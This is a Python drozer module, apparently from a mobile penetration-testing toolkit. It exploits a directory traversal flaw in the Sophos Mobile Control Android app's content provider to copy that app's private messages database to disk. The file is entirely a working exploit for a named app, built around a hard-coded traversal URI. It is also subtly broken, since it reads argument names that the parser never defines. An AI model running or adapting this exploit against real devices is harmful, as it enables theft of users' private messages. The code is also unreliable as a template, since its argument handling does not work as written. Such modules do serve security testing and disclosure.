import os

from mwr.common import fs

from drozer.modules import common, Module

class Messages(Module, common.Provider, common.ClassLoader):
    
    name = "Steal the Messages database from Sophos Mobile Control"
    description = """Extracts the Messages database from Sophos Mobile Control (com.sophos.mobilecontrol.client.android), using a directory traversal vulnerability."""
    examples = ""
    author = "Henry Hoggard"
    date = "2012-12-19"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "thirdparty", "sophos", "mobilecontrol"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
    
    __content_uri = "content://com.sophos.mobilecontrol.client.android.files/../../../../../../../../../../../../..//data/data/com.sophos.mobilecontrol.client.android/databases/message.db"
    
    def add_arguments(self, parser):
        parser.add_argument("target", help="where to save the copied database", nargs="?")
    
    def execute(self, arguments):
        data = self.contentResolver().read(self.__content_uri)
        
        if os.path.isdir(arguments.destination):
            arguments.destination = os.path.sep.join([arguments.destination, arguments.uri.split("/")[-1]])
        
        length = fs.write(arguments.destination, data)

        if length != None:
            self.stdout.write("Written %d bytes. You can open this file with sqlite3.\n" % len(data))
        else:
            self.stdout.write("Failed to read database.")

    def get_completion_suggestions(self, action, text, **kwargs):
        if action.dest == "target":
            return common.path_completion.on_console(text)
            